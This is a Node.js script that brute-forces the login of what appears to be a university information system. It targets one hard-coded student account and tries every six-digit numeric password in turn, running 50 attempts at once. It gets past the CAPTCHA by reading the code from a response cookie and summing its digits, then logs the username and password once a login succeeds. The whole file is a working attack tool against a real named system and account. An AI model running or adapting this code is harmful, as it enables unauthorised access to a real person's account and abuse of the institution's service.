import fetch from "node-fetch"
import FormData from "form-data"
import cheerio from "cheerio"

const log = console.log
const baseUrl = "http://mis.sse.ustc.edu.cn/"
const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
let success = false
let view_state = ""
let username = "sa18225541"
let password = "000000"
const app =()=>{
  const mypass = password
  fetch(baseUrl)
  .then(
    async result => {
      if(parseInt(password)>999999||success){
        return
      }
    const cookieJar:string[] = []
    const sessionId = (result.headers.get("set-cookie")||"").split(";")[0]
    cookieJar.push(sessionId) 
    const body = await result.text();
    const $ = cheerio.load(body)
    view_state = $("#__VIEWSTATE").val()
    const imgUrl = body.match(pattern) || [""];
    const url = baseUrl + imgUrl[0].replace("&amp;", "&");
    const r = await fetch(url,{
      headers:{
        "cookie":cookieJar.join(";")
      }
    })
    const str = r.headers.get("set-cookie")||""
    cookieJar.push(str.split(";")[0])
    const validateCode = (str.match(/[0-9]{4}/)||[""])[0]
    log("validate code:",validateCode)
    let sum = 0
    validateCode.split("").forEach(val=>{
      sum += parseInt(val)
    })
    log("sum:",sum)
    log("session",cookieJar)
    const formData = new FormData()
    
    formData.append("__EVENTTARGET","winLogin$sfLogin$ContentPanel1$btnLogin")
    formData.append("__VIEWSTATE",view_state)
    formData.append("winLogin$sfLogin$txtUserLoginID",username)
    formData.append('winLogin$sfLogin$txtPassword',mypass)
    formData.append('winLogin$sfLogin$txtValidate',sum)
    // formData.append("__EVENTARGUMENT","")
    // formData.append("X_CHANGED","true")
    // formData.append('winLogin$sfLogin$ContentPanel3$cbxSaveMyInfo','on')
    // formData.append('winLogin_Hidden',"false")
    // formData.append('WndModal_Hidden',"true")
    // formData.append('X_TARGET','winLogin_sfLogin_ContentPanel1_btnLogin')
    // formData.append('winLogin_sfLogin_ctl00_Collapsed',"false")
    // formData.append('winLogin_sfLogin_ContentPanel3_Collapsed',"false")
    // formData.append('winLogin_sfLogin_ContentPanel1_Collapsed',"false")
    // formData.append('winLogin_sfLogin_Collapsed',"false")
    // formData.append('winLogin_Collapsed',"false")
    // formData.append('WndModal_Collapsed',"false")
    // formData.append('X_STATE','e30=')
    // formData.append('X_AJAX',"true")
    
    const login = await fetch(baseUrl+"default.aspx",{
      method:"post",
      headers:{
        cookie:cookieJar.join(";")
      },
      body:formData
    })
    const iflysse = (login.headers.get("set-cookie")||"").split(";")[0]
  if(iflysse.length === 0 ){
    log("failed ","password: ", mypass)
    increase()
    cookieJar.length = 0
    app()
  }else{
    log("success ","用户名: ",username,"密码: ",mypass)
    success = true
    return
  }
  cookieJar.push(iflysse)
})
.catch((err) => {
  log(err)
  app()
})
};

function increase(){
  password = ""+(parseInt(password)+1)
  if(password.length<6){
    const len = password.length
    for(let i=0;i<6-len;i++){
      password = 0+password
    }
  }
}

for(let i=0;i<50;i++){
  app()
  increase()
}